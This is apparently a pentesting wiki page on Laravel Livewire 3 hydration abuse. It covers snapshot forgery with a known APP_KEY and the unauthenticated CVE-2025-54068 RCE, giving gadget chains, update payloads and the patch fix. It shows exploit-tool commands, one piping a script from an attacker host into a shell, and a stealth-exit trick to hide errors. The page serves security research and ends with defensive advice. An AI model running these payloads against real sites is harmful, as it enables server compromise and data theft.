_body: "# Laravel Livewire Hydration & Synthesizer Abuse\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Recap\
  \ of the Livewire state machine\n\nLivewire 3 components exchange their state through **snapshots** that contain `data`,\
  \ `memo`, and a checksum. Every POST to `/livewire/update` rehydrates the JSON snapshot server-side and executes the queued\
  \ `calls`/`updates`.\n\n```php\nclass Checksum {\n    static function verify($snapshot) {\n        $checksum = $snapshot['checksum'];\n\
  \        unset($snapshot['checksum']);\n        if ($checksum !== self::generate($snapshot)) {\n            throw new CorruptComponentPayloadException;\n\
  \        }\n    }\n\n    static function generate($snapshot) {\n        return hash_hmac('sha256', json_encode($snapshot),\
  \ $hashKey);\n    }\n}\n```\n\nAnyone holding `APP_KEY` (used to derive `$hashKey`) can therefore forge arbitrary snapshots\
  \ by recomputing the HMAC.\n\nComplex properties are encoded as **synthetic tuples** detected by `Livewire\\Drawer\\BaseUtils::isSyntheticTuple()`;\
  \ each tuple is `[value, {\"s\":\"<key>\", ...meta}]`. The hydration core simply delegates every tuple to the synth selected\
  \ in `HandleComponents::$propertySynthesizers` and recurses over children:\n\n```php\nprotected function hydrate($valueOrTuple,\
  \ $context, $path)\n{\n    if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;\n    [$value,\
  \ $meta] = $tuple;\n    $synth = $this->propertySynth($meta['s'], $context, $path);\n    return $synth->hydrate($value,\
  \ $meta, fn ($name, $child)\n        => $this->hydrate($child, $context, \"{$path}.{$name}\"));\n}\n```\n\nThis recursive\
  \ design makes Livewire a **generic object-instantiation engine** once an attacker controls either the tuple metadata or\
  \ any nested tuple processed during recursion.\n\n## Synthesizers that grant gadget primitives\n\n| Synthesizer | Attacker-controlled\
  \ behaviour |\n|-------------|--------------------------------|\n| **CollectionSynth (`clctn`)** | Instantiates `new $meta['class']($value)`\
  \ after rehydrating each child. Any class with an array constructor can be created, and each item may itself be a synthetic\
  \ tuple.\n| **FormObjectSynth (`form`)** | Calls `new $meta['class']($component, $path)`, then assigns every public property\
  \ from attacker-controlled children via `$hydrateChild`. Constructors that accept two loosely typed parameters (or default\
  \ args) are enough to reach arbitrary public properties.\n| **ModelSynth (`mdl`)** | When `key` is absent from meta it executes\
  \ `return new $class;` allowing zero-argument instantiation of any class under attacker control.\n\nBecause synths invoke\
  \ `$hydrateChild` on every nested element, arbitrary gadget graphs can be built by stacking tuples recursively.\n\n## Forging\
  \ snapshots when `APP_KEY` is known\n\n1. Capture a legitimate `/livewire/update` request and decode `components[0].snapshot`.\n\
  2. Inject nested tuples that point to gadget classes and recompute `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum),\
  \ APP_KEY)`.\n3. Re-encode the snapshot, keep `_token`/`memo` untouched, and replay the request.\n\nA minimal proof of execution\
  \ uses **Guzzle's `FnStream`** and **Flysystem's `ShardedPrefixPublicUrlGenerator`**. One tuple instantiates `FnStream`\
  \ with constructor data `{ \"__toString\": \"phpinfo\" }`, the next instantiates `ShardedPrefixPublicUrlGenerator` with\
  \ `[FnStreamInstance]` as `$prefixes`. When Flysystem casts each prefix to `string`, PHP invokes the attacker-provided `__toString`\
  \ callable, calling any function without arguments.\n\n### From function calls to full RCE\n\nLeveraging Livewire's instantiation\
  \ primitives, Synacktiv adapted phpggc's `Laravel/RCE4` chain so that hydration boots an object whose public Queueable state\
  \ triggers deserialization:\n\n1. **Queueable trait** – any object using `Illuminate\\Bus\\Queueable` exposes public `$chained`\
  \ and executes `unserialize(array_shift($this->chained))` in `dispatchNextJobInChain()`.\n2. **BroadcastEvent wrapper**\
  \ – `Illuminate\\Broadcasting\\BroadcastEvent` (ShouldQueue) is instantiated via `CollectionSynth` / `FormObjectSynth` with\
  \ public `$chained` populated.\n3. **phpggc Laravel/RCE4Adapted** – the serialized blob stored in `$chained[0]` builds `PendingBroadcast\
  \ -> Validator -> SerializableClosure\\Serializers\\Signed`. `Signed::__invoke()` finally calls `call_user_func_array($closure,\
  \ $args)` enabling `system($cmd)`.\n4. **Stealth termination** – by handing a second `FnStream` callable such as `[new Laravel\\\
  Prompts\\Terminal(), 'exit']`, the request ends with `exit()` instead of a noisy exception, keeping the HTTP response clean.\n\
  \n### Automating snapshot forgery\n\n`synacktiv/laravel-crypto-killer` now ships a `livewire` mode that stitches everything:\n\
  \n```bash\n./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \\\n  -j request.json --function system -p \"\
  bash -c 'id'\"\n```\n\nThe tool parses the captured snapshot, injects the gadget tuples, recomputes the checksum, and prints\
  \ a ready-to-send `/livewire/update` payload.\n\n## CVE-2025-54068 – RCE without `APP_KEY`\n\nAccording to the vendor advisory,\
  \ the issue affects Livewire v3 (>= 3.0.0-beta.1 and <= 3.6.3) and is unique to v3.\n\n`updates` are merged into component\
  \ state **after** the snapshot checksum is validated. If a property inside the snapshot is (or becomes) a synthetic tuple,\
  \ Livewire reuses its meta while hydrating the attacker-controlled update value:\n\n```php\nprotected function hydrateForUpdate($raw,\
  \ $path, $value, $context)\n{\n    $meta = $this->getMetaForPath($raw, $path);\n    if ($meta) {\n        return $this->hydrate([$value,\
  \ $meta], $context, $path);\n    }\n}\n```\n\nExploit recipe:\n\n1. Find a Livewire component with an untyped public property\
  \ (e.g., `public $count;`).\n2. Send an update that sets that property to `[]`. The next snapshot now stores it as `[[],\
  \ {\"s\": \"arr\"}]`.\n\n   A minimal type-juggling flow looks like this:\n\n   ```http\n   POST /livewire/update\n   ...\n\
  \   \"updates\": {\"count\": []}\n   ```\n\n   Then the next snapshot stores a tuple that keeps the `arr` synthesizer metadata:\n\
  \n   ```json\n   \"count\": [[], {\"s\": \"arr\"}]\n   ```\n\n3. Craft another `updates` payload where that property contains\
  \ a deeply nested array embedding tuples such as `[ <payload>, {\"s\":\"clctn\",\"class\":\"GuzzleHttp\\\\Psr7\\\\FnStream\"\
  } ]`.\n4. During recursion, `hydrate()` evaluates each nested child independently, so attacker-chosen synth keys/classes\
  \ are honoured even though the outer tuple and checksum never changed.\n5. Reuse the same `CollectionSynth`/`FormObjectSynth`\
  \ primitives to instantiate a Queueable gadget whose `$chained[0]` contains the phpggc payload. Livewire processes the forged\
  \ updates, invokes `dispatchNextJobInChain()`, and reaches `system(<cmd>)` without knowing `APP_KEY`.\n\nKey reasons this\
  \ works:\n\n- `updates` are not covered by the snapshot checksum.\n- `getMetaForPath()` trusts whichever synth metadata\
  \ already existed for that property even if the attacker previously forced it to become a tuple via weak typing.\n- Recursion\
  \ plus weak typing lets each nested array be interpreted as a brand new tuple, so arbitrary synth keys and arbitrary classes\
  \ eventually reach hydration.\n\n### High-value pre-auth target: Filament login forms\n\nApplications built on top of Livewire\
  \ often expose an even easier pre-auth surface than a toy `public $count;` property. For example, Filament login pages commonly\
  \ hydrate a weakly typed `$form` object that is already serialized as a `form` tuple in the snapshot. That removes the \"\
  scalar -> array -> `arr` tuple\" setup step entirely:\n\n- The snapshot already contains something like `{\"form\":[{...},{\"\
  s\":\"form\",\"class\":\"App\\\\Livewire\\\\Forms\\\\LoginForm\"}]}`.\n- An attacker can send `updates.form` with nested\
  \ malicious tuples directly, because recursion will eventually reinterpret children such as `[payload, {\"s\":\"clctn\"\
  ,\"class\":\"GuzzleHttp\\\\Psr7\\\\FnStream\"}]`.\n- This is why pre-auth Livewire entrypoints that expose `FormObjectSynth`\
  \ objects are especially attractive: they already provide both instantiation and public-property assignment.\n\n### Patch\
  \ analysis: preserve raw metadata during update recursion\n\nThe fix introduces a dedicated `hydratePropertyUpdate()` path\
  \ so nested update values no longer call generic `hydrate($child, ...)` on attacker-controlled children:\n\n```php\nprotected\
  \ function hydratePropertyUpdate($valueOrTuple, $context, $path, $raw)\n{\n    if (! Utils::isSyntheticTuple($value = $tuple\
  \ = $valueOrTuple)) return $value;\n    [$value, $meta] = $tuple;\n    $synth = $this->propertySynth($meta['s'], $context,\
  \ $path);\n\n    return $synth->hydrate($value, $meta, function ($name, $child) use ($context, $path, $raw) {\n        return\
  \ $this->hydrateForUpdate($raw, \"{$path}.{$name}\", $child, $context);\n    });\n}\n```\n\nSecurity impact of the patch:\n\
  \n- Nested updates are revalidated against the original raw snapshot path instead of trusting fresh attacker-supplied tuple\
  \ metadata.\n- Recursive hydration no longer lets children redefine `s` or `class` mid-flight.\n- This blocks both arbitrary\
  \ synthesizer switching and arbitrary class selection inside nested update arrays.\n\n## Livepyre – end-to-end exploitation\n\
  \n[Livepyre](https://github.com/synacktiv/Livepyre) automates both the APP_KEY-less CVE and the signed-snapshot path:\n\n\
  - Fingerprints the deployed Livewire version by parsing `<script src=\"/livewire/livewire.js?id=HASH\">` (or `?v=HASH`)\
  \ and mapping the hash to vulnerable releases.\n- Collects baseline snapshots by replaying benign actions and extracting\
  \ `components[].snapshot`.\n- Generates either an `updates`-only payload (CVE-2025-54068) or a forged snapshot (known APP_KEY)\
  \ embedding the phpggc chain.\n- If no object-typed parameter is found in a snapshot, Livepyre falls back to brute-forcing\
  \ candidate params to reach a coercible property.\n\nTypical usage:\n\n```bash\n# CVE-2025-54068, unauthenticated\npython3\
  \ Livepyre.py -u https://target/livewire/component -f system -p id\n\n# Signed snapshot exploit with known APP_KEY\npython3\
  \ Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \\\n    -f system -p \"bash -c 'curl attacker/shell.sh|sh'\"\
  \n```\n\n`-c/--check` runs a non-destructive probe, `-F` skips version gating, `-H` and `-P` add custom headers or proxies,\
  \ and `--function/--param` customise the php function invoked by the gadget chain.\n\n## Defensive considerations\n\n- Upgrade\
  \ to fixed Livewire builds (>= 3.6.4 according to the vendor bulletin) and deploy the vendor patch for CVE-2025-54068.\n\
  - Avoid weakly typed public properties in Livewire components; explicit scalar types prevent property values from being\
  \ coerced into arrays/tuples.\n- Register only the synthesizers you truly need and treat user-controlled metadata (`$meta['class']`)\
  \ as untrusted.\n- Reject updates that change the JSON type of a property (e.g., scalar -> array) unless explicitly allowed,\
  \ and re-derive synth metadata instead of reusing stale tuples.\n- Rotate `APP_KEY` promptly after any disclosure because\
  \ it enables offline snapshot forging no matter how patched the code-base is.\n\n## References\n\n- [Synacktiv – Livewire:\
